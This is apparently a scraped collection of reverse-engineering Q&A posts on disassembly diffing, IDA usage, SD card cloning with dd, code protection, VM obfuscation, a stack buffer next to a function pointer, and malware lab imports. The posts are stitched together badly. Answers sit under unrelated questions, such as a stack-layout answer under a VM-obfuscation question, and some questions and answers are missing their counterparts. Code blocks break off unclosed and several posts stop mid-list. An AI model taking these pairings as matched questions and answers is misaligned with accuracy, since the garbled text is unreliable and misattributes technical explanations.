    leave                    |     leave
    ret                      |     ret
</code></pre>

<p>You'll notice how the syntax differs. Registers in AT&amp;T syntax are denoted with the <code>%</code>, literal values with <code>$</code> and the position of source and destination register is the inverse of the Intel syntax. Furthermore some of the mnemonics differ (<code>movl</code> instead of <code>mov</code>). In Intel syntax the size of the operands helps to infer the intended operation - in case of registers this is made explicit by using EAX, AX and AL/AH respectively to denote the <code>DWORD</code> (32bit), <code>WORD</code> (16bit) and <code>BYTE</code> (8bit) sizes. However, the line:</p>

<pre><code>mov DWORD PTR [esp], OFFSET FLAT:.LC0
</code></pre>

<p>shows neatly how you have to be explicit about the size of memory locations to get it right. The AT&amp;T <code>movl</code> mnemonic implies this because of its inherent meaning of ""move long"" (32bit here), so no need to mention that we are accessing a <code>DWORD</code> other than in the <code>l</code> in <code>movl</code>.</p>

<p><strong>Please note:</strong> I trimmed some irrelevant parts at the top and the bottom of the generated assembly code for brevity.</p>

<h3>MIPS resources</h3>

<p>For the inclined reader I would recommend getting a copy of the excellent, albeit pricey:</p>

<h2>Disassembly</h2>

<p>The process of translating the binary machine language back to a mnemonic representation, usually 1:1, is called <strong>disassembling</strong> or <strong>disassembly</strong>. The result of the process is commonly referred to as <strong>disassembly</strong> as well.</p>

<p>The tool used for the process is called a <strong>disassembler</strong>.</p>

<p>Since this is mostly a 1:1 process just like the reverse (assembly to machine code) there is no need to go into much more detail. There is one big difference between hand-written or compiler-generated assembly versus disassembly of the resulting binary code, and we'll see that a bit better by comparing the output of a disassembler and a compiler.</p>

<p>So without much further ado let's go to a practical example that shows why diffing is hard.</p>

<h1>Why it is a hard task to compare binary executable code?</h1>

<p><strong>Note:</strong> For the remainder of this answer we'll use the Intel syntax for the assembly code. We'll also have some redundant parts of GCCs output removed for brevity.</p>

<h2>Sample program - first iteration</h2>

<h3>C version</h3>

<p>In our first iteration we have the following C code (I named it <code>ptest1.c</code>):</p>

<pre><code>#include &lt;stdio.h&gt;

int syntax_help(int argc)
{
        return 20 + argc;
}

int main(int argc, char **argv)
{
        if (argc &lt; 3)
                return syntax_help(argc);
        else if (argc == 3)
                return 42;
        // else ...
        return 0;
}
</code></pre>

<h3>Assembly language version (with GCC, Intel syntax)</h3>

<p>... compiling this into assembly with <code>gcc -O0 -masm=intel -S -o ptest1.asm ptest1.c</code> gives us:</p>

<pre><code>.globl syntax_help
        .type   syntax_help, @function
syntax_help:
        push    ebp
        mov     ebp, esp
        mov     eax, DWORD PTR [ebp+8]
        add     eax, 20
        pop     ebp
        ret
        .size   syntax_help, .-syntax_help
.globl main
        .type   main, @function
main:
        push    ebp
        mov     ebp, esp
        sub     esp, 4
        cmp     DWORD PTR [ebp+8], 2
        jg      .L4
        mov     eax, DWORD PTR [ebp+8]
        mov     DWORD PTR [esp], eax
        call    syntax_help
        jmp     .L5
.L4:
        cmp     DWORD PTR [ebp+8], 3
        jne     .L6
        mov     eax, 42
        jmp     .L5
.L6:
        mov     eax, 0
.L5:
        leave
        ret
</code></pre>

<h2>Sample program - second iteration</h2>

<p>Now let us modify the program a little and then assemble it again, just to see how it looks.</p>

<h3>C version</h3>

<pre><code>#include &lt;stdio.h&gt;

int syntax_help(int argc)
{
        switch (argc)
        {
        case 0:
                return -1;
        case 1:
                return 23;
        default:
                return 20 + argc;
        }
}

int main(int argc, char **argv)
{
        if (argc &lt; 5)
                return syntax_help(argc);
        else if (argc == 5)
                return 42;
        // else ...
        return 0;
}
</code></pre>

<p>As you can see the two instances of <code>3</code> in <code>main</code> changed to <code>5</code> and we tinkered a bit with the ""logic"" in <code>syntax_help</code>. Clearly this is a contrived example, but then that's the exact point.</p>

<h3>Assembly language version (same options as above)</h3>

<pre><code>.globl syntax_help
        .type   syntax_help, @function
syntax_help:
        push    ebp
        mov     ebp, esp
        mov     eax, DWORD PTR [ebp+8]
        test    eax, eax
        je      .L3
        cmp     eax, 1
        je      .L4
        jmp     .L7
.L3:
        mov     eax, -1
        jmp     .L5
.L4:
        mov     eax, 23
        jmp     .L5
.L7:
        mov     eax, DWORD PTR [ebp+8]
        add     eax, 20
.L5:
        pop     ebp
        ret
        .size   syntax_help, .-syntax_help
.globl main
        .type   main, @function
main:
        push    ebp
        mov     ebp, esp
        sub     esp, 4
        cmp     DWORD PTR [ebp+8], 4
        jg      .L9
        mov     eax, DWORD PTR [ebp+8]
        mov     DWORD PTR [esp], eax
        call    syntax_help
        jmp     .L10
.L9:
        cmp     DWORD PTR [ebp+8], 5
        jne     .L11
        mov     eax, 42
        jmp     .L10
.L11:
        mov     eax, 0
.L10:
        leave
        ret
</code></pre>

<p>That's a mouthful. Now let's dig into one difference - aside from the ""optimization"" aspect - between this and a potential human-written piece of assembly that does the same. Here's what a human-written version might look like:</p>

<pre><code>.globl syntax_help
    .type   syntax_help, @function
syntax_help:
    push    ebp
    mov ebp, esp
    mov eax, DWORD PTR [ebp+8]
    test    eax, eax
    je  .zero_args
    cmp eax, 1
    je  .one_arg
    jmp .return_20plus
.zero_args:
    mov eax, -1
    jmp .exit_help
.one_arg:
    mov eax, 23
    jmp .exit_help
.return_20plus:
    mov eax, DWORD PTR [ebp+8]
    add eax, 20
.exit_help:
    pop ebp
    ret
    .size   syntax_help, .-syntax_help
.globl main
    .type   main, @function
main:
    push    ebp
    mov ebp, esp
    sub esp, 4
    cmp DWORD PTR [ebp+8], 4
    jg  .return_42
    mov eax, DWORD PTR [ebp+8]
    mov DWORD PTR [esp], eax
    call    syntax_help
    jmp .exit
.return_42:
    cmp DWORD PTR [ebp+8], 5
    jne .return_0
    mov eax, 42
    jmp .exit
.return_0:
    mov eax, 0
.exit:
    leave
    ret
</code></pre>

<p>Anyone who has ever written assembly code will inevitably notice how I am not declaring variables (<code>db</code>, <code>dw</code>, <code>dd</code>) here. This would be the normal course of action, but of course here I was merely showing that we humans tend to give symbolic names to code locations (and variables). If you hand write assembly, it would look still different, I merely adjusted the code to look a bit more like what a human might write (i.e. it's not perfect and certainly not ""hand-optimized""). The compiler will stubbornly and efficiently tack a number on some kind of lettered prefix and be done with it. Let's also create a possible human-written version of the first iteration, using the same names:</p>

<pre><code>.globl syntax_help
    .type   syntax_help, @function
syntax_help:
    push    ebp
    mov ebp, esp
    mov eax, DWORD PTR [ebp+8]
    add eax, 20
    pop ebp
    ret
    .size   syntax_help, .-syntax_help
.globl main
    .type   main, @function
main:

<h2>Interlude - basic blocks</h2>

<p>A disassembler can only be smart to a certain extent, because it's a program. Even IDA Pro, hands down the most advanced disassembler as of this writing, will not be able to guess everything right - e.g. when distinguishing code or data. But the more sophisticated tools do a <em>pretty</em> good job at it. And IDA adds the <strong>I</strong> as <strong>interactive</strong>.</p>

<p>One thing disassemblers encounter are what assembly programmers is known as <strong>labels</strong> and <strong>(sub)routines</strong>.</p>

<p>Labels, although they exist in C and are (rightly) frowned upon together with <code>goto</code>, also exist in higher level language, but tend to cover a somewhat different concept. Perhaps the closest to the assembly language concept were the labels in the good old days of <a href=""https://en.wikipedia.org/wiki/BASIC"" rel=""nofollow noreferrer"">BASIC</a>. When you compile C into assembly code, however, every condition gets translated into a conditional or unconditional jump (<code>jmp</code>, <code>je</code>, <code>jg</code>, <code>jne</code> in the above compiler-generated code). The jump targets are referred to as <strong>labels</strong>. The jumps are the places where the code <strong>branches</strong> conditionally or unconditionally.</p>

<p>The closest corresponding concept to a routine would be a function in C or the <code>procedure</code>/<code>function</code> in Pascal or the <code>sub</code> in BASIC.</p>

<p>More or less each of the chunks of code between two branching instructions, other than <code>call</code>, are called <strong>basic blocks</strong>. In IDA Pro this is neatly visualized in the graph view (can be toggled with flat view via default <kbd>Space</kbd>):</p>

<p><img src=""https://i.stack.imgur.com/Y8Puh.png"" alt=""IDA Pro graph view demonstrating a visualization of basic blocks""></p>

<p>Each of the blocks linked by the arrows in the main IDA-view would be a <strong>basic block</strong>.</p>

<h2>Again, why it is a hard task to compare binary executable code?</h2>

<p>By now you should have a faint idea what makes the comparison hard, but let's go the extra mile. Let's switch from comparing the compiler-generated and ""human-written"" assembly code to actual disassembly.</p>

<p>As before we will stick to the gist of it.</p>

<h2>Compiler-generated versus disassembly</h2>

<p>But just to mention it, in the disassembly you have the result after the <a href=""https://en.wikipedia.org/wiki/Linker_%28computing%29"" rel=""nofollow noreferrer"">linker</a> <em>mangled</em> it. The compiler-generated assembly from before contained merely the code <em>we</em> had written in the sample program.</p>

<p>Just to give you an idea, I generated an <code>.asm</code> file using IDA, stripped it down to everything without comments and empty lines and still ended up with 362 lines, as opposed to 52 lines in the original compiler-generated assembly which included meta-data used by the linker. This whopping difference can of course be attributed to the linker adding all kinds of code required to initialize the executable. In fewer words: it's boiler plate code the compiler (or more precisely its linker) adds.</p>

<p>For this comparison I am going to leave out this boiler plate code entirely, although obviously this only adds to the complexity a <code>diff</code> tool will encounter when comparing binary executable code.</p>

<p>Unlike in the IDA screenshot above, which shows <code>ptest2.c</code> disassembled, in reality you will mostly have to work without <a href=""https://en.wikipedia.org/wiki/Debug_symbol"" rel=""nofollow noreferrer"">debug symbols</a>. This means the names such as <code>main</code> and <code>syntax_help</code> will no longer exist. Instead disassemblers such as IDA Pro mostly resort to naming the routines after their offset (e.g. <code>sub_80483DB</code>). It applies the same for labels (i.e. naming those <code>loc_80483F4</code> or <code>locret_something</code>). Of course the reverse engineer is free to change these names to something more readable/recognizable for herself. But the default names still depend on the offset.</p>

<p>In fact the disassembler will have a hard time to identify the <code>main</code> function, because the aforementioned boiler plate code tends to come <em>before</em> it when looking at it starting from the entry point of the executable. Here's what IDA shows you if there are no symbols available to the compiled <code>ptest2.c</code> from before (i.e. ran <code>strip -s ...</code>):</p>

<p><img src=""https://i.stack.imgur.com/XTlLt.png"" alt=""IDA Pro showing the entry point of compiled &lt;code&gt;ptest2.c&lt;/code&gt;""></p>

<p>Now let's look at the entry point for the compiled (and stripped) <code>ptest1.c</code> as well:</p>

<p><img src=""https://i.stack.imgur.com/o0tAE.png"" alt=""IDA Pro showing the entry point of compiled &lt;code&gt;ptest2.c&lt;/code&gt;""></p>

<p>Do you notice the difference? It's subtle, but let me put them side to side for you:</p>

<p><img src=""https://i.stack.imgur.com/L5jXL.png"" alt=""Side by side comparison""></p>

<p>Yes, the highlighted lines ... ooh the offsets differ. What does that mean?</p>

<p>Well, it means that the symbolic names IDA Pro assigns to routines and also to labels (i.e. basic blocks) will differ based on the offset of these entities within the file. </p>

<p>This is very similar indeed to what we encountered before with the compiler-generated assembly code and the numbered label names.</p>

<h3>Using a simpler disassembler</h3>

<p>Let's compare the relevant pieces of code created by a simpler disassembler in a text differ.</p>

<p>Using <code>objdump -M intel -d ...</code> and then getting rid of the leading offsets and spaces we get this for the relevant parts in WinMerge:</p>

<p><img src=""https://i.stack.imgur.com/nn9X8.png"" alt=""WinMerge of the disassembly created with objdump""></p>

<p>Full commands were:</p>

<pre><code>objdump -M intel -d ptest1.stripped|grep '^ 80'|cut -f 2- -d ':'|sed 's/^\s*//g'
objdump -M intel -d ptest2.stripped|grep '^ 80'|cut -f 2- -d ':'|sed 's/^\s*//g'
</code></pre>

<h1>Conclusion</h1>

<p>This means text diffing tools such as <code>diff</code>, <code>kdiff3</code>, <code>WinMerge</code> and many others will have a hard time comparing disassemblies unless the reverse engineer took the time to rename all routines and labels to something not based on the offset.</p>

<p>In fact this becomes an almost insurmountable task when facing a disassembly in textual form. The internal form IDA Pro keeps of the disassembly is much more suitable.</p>

<p>In text form every single changed offset - and there will be loads of those - will draw your attention because it is a difference to a text differ.</p>

<h1>Solutions</h1>

<p>Not that we know the problem, what can we do about it?</p>

<p>Basic blocks are the answer to the problem at hand. Tools like <a href=""http://www.darungrim.org"" rel=""nofollow noreferrer"">DarunGrim</a> (FLOSS), <a href=""http://code.google.com/p/patchdiff2/"" rel=""nofollow noreferrer"">patchdiff2</a> (FLOSS) and Bindiff (commercial) use IDA's knowledge about basic blocks to build graphs. These graphs can then be used to identify similar and different blocks. With the abstraction in the form of a graph the visualization can be superimposed on the respective view inside IDA or a specialized view can be offered.</p>

<p>As you see, when you export your disassembly to a text file, you are stripping a whole lot of contextual information from it which IDA keeps for you in its database. Instead draw from the information IDA already has and use it. Plugins and scripts allow you to reach into the guts of the IDA database and extract what treasures are in there to make sense of basic blocks in a way a text differ will never be able to.</p>

<h1>TL;DR</h1>

<p>The reason text differs are insufficient for handling textual disassembly is because the textual representation discards valuable information the disassembler collects during the process of disassembling. Also disassemblers name the code locations and variables after their offsets - changes to a program with subsequent recompilation <strong>will change virtually all offsets and therefore create a lot of noise</strong> in the textual representation. Text differs will point out every single one, making it impossible to find the <em>relevant</em> changes from the reverse engineer's point of view.</p>

"How to apply IDA structure to a pointer of a structure","2589","","<p>I've encountered this function, which accepts a pointer to what I believe is a custom C struct. I came to this conclusion based on subsequent access to it.</p>

<p>I do not know the size of the structure, but I've seen <code>[ebp+0f14h]</code>. Therefore, I've defined a custom IDA sturct of size <code>0xF14</code>.

","<p>To set register as an offset to a structure in a sequence of assembly code, you'll need to select that sequence and then hit <kbd>T</kbd>. A pop up dialog called ""Structure offsets"" will appear, where you can supply the register and structure it points to, and you'll see all references IDA recognized using it.</p>

<p>Lets take the following code snippet taken from calc.exe for example:</p>

<p><a href=""https://i.stack.imgur.com/abcBG.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/abcBG.png"" alt=""Example of initial state""></a></p>

<p>Please notice the following caveats/remarks:</p>

<ol>
<li>IDA completely ignored the <code>add ecx, 4</code> line and additionally did not handle the <code>mov [ecx+eax*2], dx</code> too well because of that. Hitting <kbd>T</kbd> for that specific line and suppling a non-zero offset delta will let you handle that properly, albeit manually.  </li>
<li>As mentioned in the comments, manually setting a register's name completely disables all IDA's representation of the register and instead displays the user supplied free text. This means any offset definitions will be hidden by any register custom name.</li>
<li>If you've seen <code>[ebp+0f14h]</code>, the structure's size is <em>at least</em> 0xF15 bytes, as the structure is being written to at offset <code>0x0F14</code>, meaning at least 0xF15 bytes are available to it. If you've seen <code>DWORD [ebp+0f14h]</code> the structure is at least <code>0x0F18</code> bytes long.</li>

"What to do when IDA cannot provide a function name?","2564","","<p>For learning (<em>and fun</em>) I have been analyzing a text editor application using IDA Pro. While looking at the disassembly, I notice many function calls are made by explicitly calling the name of the function. For example, I notice IDA translates most function calls into the following two formats.</p>

<pre><code>call cs:CoCreateInstance
</code></pre>

<p>Or</p>

<pre><code>call WinSqmAddToStream
</code></pre>

<p>But sometimes the format does not use a function name. The following example includes the code leading up to the line in question. The third line of code seem to be ""missing"" the function name. (The comments are my own.)</p>

<pre><code>mov rcx, [rsp+128h+var_D8]    // reg CX gets the address at stack pointer+128h+var_D8 bytes 
mov r8, [rcx]                 // the address at reg CX is stored to reg r8
call qword ptr [r8 + 18h]     // at address rax+18h, call function defined by qword bytes 
</code></pre>

<p>My questions are as follows:</p>

<ol>
<li><p>How do I make the connection between <code>call qword ptr &lt;address&gt;</code> and a function in the disassembly?</p></li>
<li><p>I understand that IDA cannot use a function name here since it does not know the value stored at the register R8... so what causes this? Was there a certain syntax or convention used by the developer? In other words, did the developer call the function <code>WinSqmAddToStream</code> in a different manner than the function at <code>[r8+18h]</code>?</p></li>
</ol>
","<p>To connect an indirect call to its target (if you know it) you can do the following:</p>

<p>1) Add a custom cross-reference - either with IDC/Python, or from the Cross References subview. If you use scripting, don't forget to add the XREF_USER flag so IDA does not delete it on reanalysis.</p>

<p>2) Use the ""callee"" plugin (Edit->Plugins->Change the callee address, or Alt+F11). This will automatically add a cross-reference and also a comment next to the call.</p>

<p>As for why the explicit call is not present in the binary there can be many explanations. The snippet you're showing looks like a virtual function call, and they are usually done only in this manner to account for possibility of the method being overridden in a derived class.</p>

<p>It works fine when I re-use it in <code>nasm</code> assembler in this way.</p>

<pre><code>.section rodata
S_label1: db 0x01
         db 0x02
         ....  
.section data
        db 0x01
S_label2:  db 0x02
         ....
.section bss
S_label3: db 0x00
         db 0x00
         ....

nasm -f elf test.s
</code></pre>

<p>But basically my question is that:</p>

<p>how to re-use these dumped sections in <code>gas</code> asssembler?</p>

<p>Basically <code>gas</code> has a different assemble style, and apparently the data sections representations are different...</p>

<p>I tried for several times and I still can not find the solution..</p>

<p>Did I clearly demonstrate my question..? Could anyone give me some help?</p>

<p>=======update==========</p>

<p>So basically I want to re-use the <code>rodata</code> <code>data</code> and <code>bss</code> sections dumped from another binary.</p>

<p>For example, here is the content of <code>rodata</code> section</p>

<pre><code>03000000 01000200 0a0a556e 736f7274
65642061 72726179 2069733a 20200020
25642000 0a0a536f 72746564 20617272
61792069 733a2020 00
</code></pre>

<p>and I can re-use it in this way:</p>

<pre><code>label1: 
db 0x03
db 0x00
db 0x00
db 0x00
label2: 
db 0x01
db 0x00
db 0x02
db 0x00
.....

mov eax, label1      // of course I will guarantee that I use it correctly
....
</code></pre>

<p>Basically in <code>nasm</code>, I can easily re-use them in the above way, but my question is that , how can I re-use it in <code>gas</code> (or directly use <code>gcc</code>) in a similiar way?</p>

<p>Is it possible?</p>
","<p>As an assembly programmer I would say that <code>gas</code> is rarely used to assemble external code. The task of calling <code>gas</code> is usually left to the compiler, and most of the assembly that <code>gas</code> has to handle in real life is either <code>inlined</code> inside <code>C</code> or <code>C++</code> code or comes from a compiler. But, I believe <a href=""https://web.eecs.umich.edu/~prabal/teaching/eecs373-f11/readings/Assembler.pdf"" rel=""nofollow"">this</a> document by <strong>Dean Elsner</strong>, <strong>Jay Fenlanson</strong> &amp; <strong>friends</strong> is by far the best reference I managed to rely on for quite sometime. It has been updated many times and it covers the 2.19.51 version.</p>

<p>The easy way would be to use <strong>GCC</strong> I would say :</p>

<pre><code>  //Just to avoid make a point :]
  typedef unsigned char byte;

  //
  byte lbl1[] = { 0x03, 0x00, 0x00, 0x00, ... }, 
       lbl2[] = { 0x01, 0x00, 0x02, 0x00, ... };

  //I prefer Intel syntax rather than AT&amp;T, it's somehow cleaner !
  __asm__(""intel_syntax noprefix                 ;""
          ""mov eax, %0                           ;""
          ""mov ebx, %1                           ;""
          ""att_syntax prefix                     ;""
          :                        //output
          : ""r"" (lbl1), ""r"" (lbl2) //input
          : ""%eax"", ""%ebx"");       //clobber
</code></pre>

<p>Well, this is a nice way if you want to concentrate on the assembly code (which is how I do it when I optimize code by hand). </p>

<p>Now, let me explain it a bit. First, you have two arrays containing the retrieved data, nothing fancy. Then you get the assembly code. If you're not familiar with <code>inlined</code> assembly I would recommend you <a href=""http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html"" rel=""nofollow"">this</a> link, though I'll briefly go over my code.
The <code>__asm__</code> directive lets you insert assembly instructions anywhere in a code. At first I tell the assembler that I'll be using Intel's syntax (no % prefix for registers, ...), then I move the content of the register %0 in <code>eax</code>, and then the content of %1 in <code>ebx</code> (%0 is the pointer for <strong>lbl1</strong>, %1 is the pointer for <strong>lbl2</strong>). Then, I switch to AT&amp;T syntax for the rest of the parameters. After the first <strong>:</strong> you can specify output variables. After the second <strong>:</strong> you can specify inputs. In here I passed <strong>lbl1</strong> &amp; <strong>lbl2</strong> and I used <strong>""r""</strong> to let the compiler handle register allocation. You can specify the registers if you know what you're doing. After the last <strong>:</strong> you have to declare the registers used inside the code so that the compiler frees them &amp; uses them for the remaining code generation steps.  </p>

","<p>(Answer converted from comment)</p>

<p>Recovering the toolchain provenance of the binary code you've specified, at the very least, requires comparing the results of various PIC compilers, I don't know PIC assembly but the last two instructions look interesting for identifying the compiler (Provided your disassembler has misinterpreted the information at <code>0x38</code>, how can the instruction possibly be called?). </p>

<p>Some compilers generate prologues to functions intended for quick-n-dirty later patching that can be a giveaway as well. Best of luck! </p>

"Why would copying a micro SD card using dd fail to produce a bootable card?","2546","","<p>I have an embedded device which is loosely based around a <a href=""https://www.olimex.com/Products/OLinuXino/iMX233/"" rel=""nofollow"">Olinixino iMX233</a> design. This has a Freescale iMX233 microprocessor and boots from a socketed 2GB microSD card.</p>

<p>I wish to alter the filesystem, but also backup the filesystem prior to altering it so that I don't brick the device. </p>

<p>To achieve this, I obtained a similar 2GB micro SD card, and cloned the current SD card using <em>dd</em> in a USB card reader:</p>

<pre><code>dd if=/dev/sdc of=HeatmiserSDC.img
</code></pre>

<p>then after swapping cards:</p>

<pre><code>dd if=HeatmiserSDC.img of=/dev/sdc
</code></pre>

<p>When this new card is placed in the device, it fails to boot.</p>

<p>I have also now tried the sg3_utils utility <em>sg_dd</em> which operates at a slightly lower level. This has produced a slightly different image file but still won't boot.</p>

<p>I have also now used a SD to micro SD adapter in a direct SD card interface (/dev/mmcblk0) in a Thinkpad x220. This also failed to boot.</p>

<p>The serial console produces a single error code when it fails to boot, <em>0x8020a007</em>, which doesn't provide much useful during a Google search.</p>

<p>I have tried multiple cards, including some 4GB cards. This doesn't seem to be a space issue - sometimes one 2GB SD card is slightly smaller than another. The board also seems to be using the SD protocol and not the SPI protocol. The SPI protocol is sometimes not very reliable on newer cards.</p>

<p>The magic number of 0x33221100 is mentioned in some Freescale documentation, though I was expecting to see it with the opposite endianness. </p>

<p>So to make a successful clone, choose a SD card of larger capacity to ensure nothing is overwritten (or you can resize partitions).</p>

<p>Take an image of the original card:</p>

<pre><code>root@kali:~# dd if=/dev/mmcblk0 of=wholeSD.img
3899392+0 records in
3899392+0 records out
1996488704 bytes (2.0 GB) copied, 98.3687 s, 20.3 MB/s
</code></pre>

<p>Then take an image of just the last sector for the BCB:</p>

<pre><code>root@kali:~# dd if=/dev/mmcblk0 bs=512 count=1 skip=3899391 of=BCB.img
1+0 records in
1+0 records out
512 bytes (512 B) copied, 0.000220203 s, 2.3 MB/s
</code></pre>

<p>Find out how big the new SD card is:</p>

<pre><code>Disk /dev/mmcblk0: 2002 MB, 2002780160 bytes
4 heads, 16 sectors/track, 61120 cylinders, total 3911680 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x0f6c2d46

        Device Boot      Start         End      Blocks   Id  System
/dev/mmcblk0p1            2048       32000       14976+  53  OnTrack DM6 Aux3

/dev/mmcblk0p4          400001     3899391     1749695+  83  Linux
</code></pre>

<p>This one is larger with 3911680 sectors.</p>

<p>Move the whole card image onto the new card:</p>

<pre><code>root@kali:~# dd if=wholeSD.img of=/dev/mmcblk0
13899392+0 records in
3899392+0 records out
1996488704 bytes (2.0 GB) copied, 1545.45 s, 1.3 MB/s
</code></pre>

<p>And then move the BCB image to the last sector of the card:</p>

<pre><code>root@kali:~# dd if=BCB.img bs=512 count=1 seek=3911679 of=/dev/mmcblk0
1+0 records in
1+0 records out
512 bytes (512 B) copied, 8.4684e-05 s, 6.0 MB/s
</code></pre>

<p>Note the use of seek (output side) rather than skip (input side).</p>

<p>It is worth double checking that the last block has been written. Several cheap SD cards don't seem to work in the last sectors, possibly because they misreport size.</p>

<p>Now you have a booting card.</p>

"Enumerate all XefsTo a Segment in IDAPython","2537","","<p>What is the best method to enumerate all xrefs to addresses in a particular segment? I came up with a brute-force approach (as seen below). The code scans each address in a segment and checks for an XrefTo the address. </p>

"Stronger than Themida?","2492","","<p>I am new to reverse engineering and file protections. I have made a trading algorithm for Tradestation that I have put into a C++ DLL instead of having the source laying around, and I want to protect it further from reverse engineering. Is there something stronger than Themida out there?</p>
","<p>You might want to review an answer I provided before <a href=""https://reverseengineering.stackexchange.com/questions/118"">over here</a>. Themida and CodeVirtualizer are fine. If you want something stronger you should keep your code on a server or run it on a dedicated hardware dongle intended for copy protection. Make sure the dongle is one that actually runs your algorithms and doesn't just encrypt some parts of the code and run it on the PC side.</p>

<p>Be aware though that all they do is increase the amount of motivation an adversary needs in order to find out how your stuff works. I would examine what the value of your secrets really are. The best something like CodeVirtualizer and Themida can achieve is to create the equivalent of a black box. However it will always be possible to probe your black box with different inputs and observe the outputs. So in best case your protected code will be equivalent to keeping your code running on a server, only accessible offline. If offline is a requirement you're stuck with these sorts of solutions, either something commercial off the shelf or something homegrown. Otherwise I would strong recommending centralizing as much as possible of your algorithms on a server. Why not make your DLL for Tradestation a thin wrapper around a web API?</p>

<p>Trading algorithms, if effective, can definitely fall under something that would be valuable enough to protect on a server. </p>

<p>There's also the issue of mistranslations where CodeVirtualizer or Themida does an incorrect translation of the machine instructions into their own VM instructions which could lead to bugs. Are you willing to accept an incorrect trade and possibly holding a bad position due to translation bugs in the translation engine of Themida, VMProtect or whatever you choose to use?</p>

"How are stripped shared libraries linked against?","2485","","<p>Lately I've been reversing the Android framework for the Nexus S mobile phone.
99% of the source code is of course open, but there are few propriety shared libraries which needs to be downloaded in order to compile the operating system.
These shared libraries are stripped from symbols and suddenly I came to understand that I don't really understand how stripped libraries are linked against. How can the linker match referenced library functions if the symbols don't exist?</p>
","<p>Even stripped libraries still must retain the symbols necessary for dynamic linking. These are usually placed in a section named <code>.dynsym</code> and are also pointed to by the entries in the dynamic section.</p>

"Can IDA Pro automatically deal with VM obfuscated binaries?","2478","","<p>VM packers like Code Virtualizer and VMProtect seem challenging to existing reverse engineering work, especially static approach like IDA Pro.</p>

<p>According to this slides</p>

<p>www.hex-rays.com/products/ida/support/ppt/caro_obfuscation.ppt</p>

<p>from Hex-rays, IDA Pro requires experienced reverse engineer to manually recognize the opcode array and understand the semantic, then decode the bytecode array..</p>

<p>I myself use IDA Pro to deal with simple quicksort program using Code Virtualizer, and I can share two pics.</p>

","<p>The compiler did put the function pointer after the buffer.</p>

<pre><code>804856d:  mov    -0xc(%ebp),%eax

<p>You can see that the address being jumped to is loaded from <code>[ebp-0xc]</code> which is 0x4c (76) bytes after the beginning of the character buffer.</p>

<p>Here's a stack layout from IDA which will hopefully make things clearer:</p>

<pre><code>-00000058 buffer          db 76 dup(?)
-0000000C functionpointer dd ?

<p>Offsets in the leftmost column are ebp-relative. Memory addresses increase downwards, so it's obvious that writing too much data into <code>buffer</code> will overwrite the function pointer (and then the return address).</p>

"How to figure out which imported function(s) in a virus determine its behaviour?","2473","","<p>I want to know how to find the functions which is interesting in malware tools.
For example, I have a sample of unknown virus (this sample is <code>lab01-01.exe</code> in the book practical malware analysis <code>lab1-01.dll</code>). It is not packed.</p>

<p>I am supposed to find out what does this malware by knowing the imported DLLs and the functions it uses. Here are the imported functions in the executable file <code>lab01-01.exe</code>:</p>

<pre><code>KERNEL32.dll :
CloseHandle
UnmapViewOfFile
IsBadReadPtr
MapViewOfFile
CreateFileMappingA

_adjust_fdiv
_controlfp
_except_handler3
_exit
_initterm
_stricmp
_XcptFilter
exit
malloc
</code></pre>

<p>But, I didn't find any function imported from <code>lab01-01.dll</code>. </p>

<p>I also want to know why, although the book mentioned that both the executable file and DLL are related (it should be imported).</p>
","<p>Dlls can not only be imported statically but also dynamically. For the dynamic case, it uses <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684175(v=vs.85).aspx"" rel=""nofollow""><code>LoadLibrary</code></a> to load the dll, and <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683212(v=vs.85).aspx"" rel=""nofollow""><code>GetProcAddress</code></a> to resolve the address of the function it needs. </p>

<p>If the dlls are imported statically, then a simple dependency walking will give you information about each dll its imports and also the function within each of them it uses. This information is actually present in the PE header which a tool like <em>dependency walker</em> shows you.</p>

<p>If the dll is imported dynamically, then walking through the imports will not give you any idea about the dlls and functions it uses. In such a case, debug the application (if possible). Set a breakpoint on <code>kernel32.LoadLibraryA</code> / <code>kernel32.LoadLibraryW</code> or even the undocumented <code>ntdll.LdrLoadDll</code> and run the app. When the breakpoint is hit you immediately know which dll it is trying to import. Similarly setting a breakpoint on <code>GetProcAddress</code> will reveal the function the application wants to use.</p>

<p>I am talking about the simplest case here. You may encounter malware which bypasses the LoadLibrary mechanism totally, by implementing its own PE loader. See <em><a href=""http://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/"" rel=""nofollow"">this</a></em> page for such an example. Similarly <code>GetProcAddress</code> can be bypassed too, by manually parsing the import tables.</p>

","<p>I can think of two methods to achieve this:</p>

<ol>
<li>Using <code>RunTo</code>.</li>
<li>Setting a breakpoint, hooking debugger events and implementing <code>dbg_bpt</code></li>
</ol>

<h1>1. Using <code>RunTo</code></h1>

<p>This is nearly trivial to do, but does not give the same amount of control as the second approach. It might be better for quick and dirty type of solutions, if that's what you're after.</p>

<p>Calling <code>idc.RunTo(ea)</code> will execute the process until an <code>ea</code> is reached, allowing you to then call <code>idc.GetRegValue(name)</code> to get the value of <code>EAX</code>.</p>

<p>Certain conditions (like an exception thrown or a different breakpoint being hit) will cause <code>RutTo</code> to return before the provided <code>ea</code> is reached. You could then call <code>idc.GetDebuggerEvent</code> to figure out what happened, but if you're gonna do that I suggest switching to the second approach.</p>

<p>Note <code>RunTo</code> will also start up a process if there's no running process.</p>

<h1>2. Setting a breakpoint, hooking debugger events and implementing <code>dbg_bpt</code></h1>

<p>This is the safer and would be my recommended approach, while being harder to implement it allows properly handling other breakpoints and more control.</p>

<p>For this, you'll have to do three things:</p>

<ol>
<li>Set up a breakpoint at given address.</li>
<li>Monitor for the breakpoint's trigger.</li>
<li>And finally act upon it.</li>
</ol>

<h2>Set up a breakpoint at given address</h2>

<p>The most basic method of achieving this is by calling the <code>idc.AddBpt(ea)</code>, which sets a software on execution breakpoint at that address.</p>

<p>Additional methods you could use include:</p>

<ol>
<li><code>idc.AddBptEx(ea, size, bpttype)</code> to have more control on the type of breakpoint you're creating.</li>
<li><code>idc. SetBptAttr(address, bptattr, value)</code> to set the breakpoint's available attributes.</li>
<li><code>idc.SetBptCnd(ea, cnd)</code> / <code>idc. SetBptCndEx(ea, cnd, is_lowcnd)</code> to set the breakpoint's trigger condition.</li>
</ol>

<p>Read the documentation for the exact details.</p>

<h2>Monitor for the breakpoint's trigger</h2>

